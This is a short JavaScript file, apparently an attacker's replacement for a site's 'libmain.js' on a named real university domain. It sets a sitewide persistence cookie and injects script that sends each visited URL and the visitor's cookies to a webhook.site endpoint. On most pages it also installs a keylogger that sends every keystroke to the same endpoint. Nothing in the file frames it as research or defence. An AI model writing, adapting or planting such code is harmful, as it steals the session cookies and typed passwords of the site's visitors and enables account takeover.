// REPLACE ENTIRE libmain.js with this:
(function(){
    // Sitewide persistence
    if(!document.cookie.includes('xss=1')){
        document.cookie='xss=1;path=/;domain=.mgkvp.ac.in';
    }
    
    // Home page & everywhere
    if(document.cookie.includes('xss=1')){
        var beacon = document.createElement('script');
        beacon.innerHTML = `
            console.log('🔥 [XSS] Sitewide Active! URL: `+location.href+`');
            navigator.sendBeacon('https://webhook.site/YOUR-ID', 
                new Blob([JSON.stringify({url:location.href,cookies:document.cookie})]));
            
            // Home page special
            if(location.href.includes('mgkvp.ac.in') && !location.href.includes('DeptFacilities')){
                console.log('All good');
                document.addEventListener('keydown',e=>fetch('https://webhook.site/YOUR-ID?key='+e.key));
            }
        `;
        document.body.appendChild(beacon);
    }
})();
